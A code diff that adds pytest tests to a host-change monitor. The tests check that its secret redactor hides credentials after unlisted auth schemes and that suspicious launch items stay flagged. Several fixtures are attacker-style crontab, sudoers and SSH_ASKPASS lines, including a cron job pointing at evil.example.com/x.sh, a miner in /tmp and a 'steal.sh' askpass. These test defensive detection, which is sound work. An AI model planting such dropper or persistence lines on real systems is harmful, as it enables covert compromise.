@@ -379,3 +379,97 @@ def test_property_no_rescan_loop_remains():
     assert "_REDACT_MAX]" in body
     # and no helper recurses either
     assert "_show(" not in body
+
+
+# --------------------------------------------------------------- P6: unnamed auth schemes
+# The single-token design masks exactly ONE token per match, so a scheme word absorbed the mask
+# and the credential after it printed in cleartext. Naming schemes can never be complete
+# (bearer/basic/token/apikey/digest/negotiate were covered; SSWS, NTLM, HMAC and any vendor
+# scheme were not), and `header = "Authorization: <scheme> <token>"` lives in .curlrc/.wgetrc,
+# both tracked files. A bare alphabetic word under a credential key IS a scheme, so the secret
+# is what follows it.
+@pytest.mark.parametrize("scheme", ["SSWS", "NTLM", "HMAC", "AcmeSig", "Negotiate", "Bearer",
+                                    "ApiKey", "Digest", "signature", "OAuth"])
+@pytest.mark.parametrize("marker", MARKERS)
+def test_property_unnamed_auth_scheme_does_not_shield_the_secret(scheme, marker):
+    secret = "SeCrEtVal123abc"
+    for line in (f'header = "Authorization: {scheme} {secret}"',
+                 f'X-Auth: {scheme} {secret}',
+                 f'authorization={scheme} {secret}'):
+        out = since.redact(marker + line)
+        assert secret not in out, f"{scheme}: {out!r}"
+
+
+@pytest.mark.parametrize("line", [
+    "PasswordAuthentication=yes",
+    "PasswordAuthentication no",
+    "password required pam_unix.so",
+    "AuthorizedKeysFile .ssh/authorized_keys",
+    "deva ALL=(ALL) NOPASSWD: /usr/bin/passwd bob",
+    "PermitRootLogin prohibit-password",
+])
+@pytest.mark.parametrize("marker", MARKERS)
+def test_property_scheme_rule_does_not_hide_directives(line, marker):
+    """The guard that keeps the scheme rule honest: it read `yes` in
+    `PasswordAuthentication=yes API-KEY: …` as a scheme, masked the harmless key name and left
+    the real credential. A config keyword is never a scheme, and the following token must itself
+    look like a secret."""
+    assert since.redact(marker + line) == marker + line
+
+
+@pytest.mark.parametrize("marker", MARKERS)
+def test_property_escaped_quote_does_not_split_the_value(marker):
+    """A quoted value may contain an escaped quote; splitting there left the rest — including the
+    secret — outside the match."""
+    for line, secret in [('password="a\\"b SeCrEtVal123"', "SeCrEtVal123"),
+                         ("token='x\\'y SeCrEtVal123'", "SeCrEtVal123")]:
+        assert secret not in since.redact(marker + line), since.redact(marker + line)
+
+
+# --------------------------------------------------------------- P7: round-4 regressions
+# H1 (worst of the round): the interpreter caveat CLEARED `suspicious`, so an unsigned binary named
+# `sh`/`node`/`python_helper` — a name the attacker chooses — dropped from RED to YELLOW, stopped
+# firing --notify, and its "unsigned" label was replaced by a reassuring explanation.
+@pytest.mark.parametrize("basename", ["sh", "bash", "node", "env", "python3", "python_helper"])
+def test_interpreter_caveat_never_clears_suspicion(monkeypatch, basename):
+    monkeypatch.setattr(since, "trust_of", lambda p: ("unsigned", True))
+    monkeypatch.setattr(since, "plist_program_and_argv",
+                        lambda k: (f"/tmp/.evil/{basename}", ""))
+    f = {"category": "launch_items", "action": "added", "key": "/x.plist", "value": "v",
+         "level": since.ORANGE, "label": "job", "trust": None, "why": None, "undo": None}
+    since._enrich(f, {})
+    assert f["level"] == since.RED, f
+    assert "unsigned" in f["trust"] and "interpreter" in f["trust"], f["trust"]
+
+
+@pytest.mark.parametrize("line,secret", [
+    ('header = "Authorization: SSWS s3cr3tXyZ9aB4qW"', "s3cr3tXyZ9aB4qW"),
+    ('header = "Authorization: HMAC-SHA256-VERY-LONG-SCHEME-NAME s3cr3tXyZ9aB4qW"', "s3cr3tXyZ9aB4qW"),
+    ('password="' + "A" * 520 + ' s3cr3tXyZ9aB4qW"', "s3cr3tXyZ9aB4qW"),
+    ("password := s3cr3tXyZ9aB4qW", "s3cr3tXyZ9aB4qW"),
+    ("password => s3cr3tXyZ9aB4qW", "s3cr3tXyZ9aB4qW"),
+    ("password==  s3cr3tXyZ9aB4qW", "s3cr3tXyZ9aB4qW"),
+    ("env _auth /J.9V3dlL6/_u_46b273Sa8U/E+=h_YX7rR7.62", "J.9V3dlL6"),
+])
+@pytest.mark.parametrize("marker", MARKERS)
+def test_property_round4_leaks_stay_closed(line, secret, marker):
+    """An unlisted auth scheme absorbing the mask; a quoted value past the old 512 bound; a
+    separator RUN so the next token was not the secret; and a base64 token that looks like a path
+    because base64 uses '/' (which is how the path exemption re-opened the P1 leak)."""
+    assert secret not in since.redact(marker + line)
+
+
+@pytest.mark.parametrize("line", [
+    "*/5 * * * * /opt/bin/refresh_token http://evil.example.com/x.sh",
+    "*/5 * * * * /tmp/.token_sync /tmp/.x/miner.sh",
+    "0 3 * * * /home/u/.api_key_refresh /tmp/.hidden/payload",
+    "SSH_ASKPASS /tmp/steal.sh",
+    "Defaults!/usr/bin/passwd !authenticate",
+    "password sufficient pam_deny.so",
+    "password required pam_unix.so",
+])
+@pytest.mark.parametrize("marker", MARKERS)
+def test_property_payload_context_stays_visible(line, marker):
+    """H2: masking the token after a credential-named path made an attacker-named dropper's
+    download URL vanish from the crontab diff. A URL, or a LOW-ENTROPY path, is the payload."""
+    assert since.redact(marker + line) == marker + line
